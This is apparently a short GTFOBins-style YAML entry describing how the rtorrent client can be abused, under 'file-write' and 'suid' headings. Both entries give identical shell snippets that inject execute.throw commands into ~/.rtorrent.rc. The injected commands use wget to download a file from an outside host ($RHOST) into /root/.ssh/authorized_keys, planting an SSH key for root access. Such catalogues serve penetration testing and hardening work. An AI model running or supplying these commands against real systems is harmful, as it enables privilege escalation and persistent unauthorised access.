---
description: a BitTorrent client for ncurses.
functions:
  file-write:
    - code: |
        cat >> ~/.rtorrent.rc <<EOF
        execute.throw = mkdir,/root/.ssh
        execute.throw = wget,http://$RHOST:$RPORT/$RFILE,-O,/root/.ssh/authorized_keys
        EOF
        rtorrent
  suid:
    - code: |
        cat >> ~/.rtorrent.rc <<EOF
        execute.throw = mkdir,/root/.ssh
        execute.throw = wget,http://$RHOST:$RPORT/$RFILE,-O,/root/.ssh/authorized_keys
        EOF
        ./rtorrent
---
